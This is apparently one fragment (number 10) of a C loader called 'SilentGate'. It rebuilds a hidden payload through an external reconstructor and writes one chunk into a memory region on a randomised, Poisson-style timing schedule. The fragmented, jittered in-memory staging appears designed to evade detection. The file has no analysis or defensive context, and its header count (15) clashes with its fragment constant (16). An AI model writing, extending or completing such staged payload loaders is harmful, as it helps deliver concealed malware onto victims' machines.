/*
 * SilentGate Fragment 10/15
 * Offset: 74860 bytes  Size: 7486 bytes
 * Schedule: t=733ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   10
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  119778
#define CHUNK_OFFSET  74860
#define CHUNK_SIZE    7486
#define SLEEP_NEXT_MS 733

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 10: Write chunk 10 */
void sg_execute_fragment_10(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 10] Writing chunk at t=733ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 10] Chunk 10 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
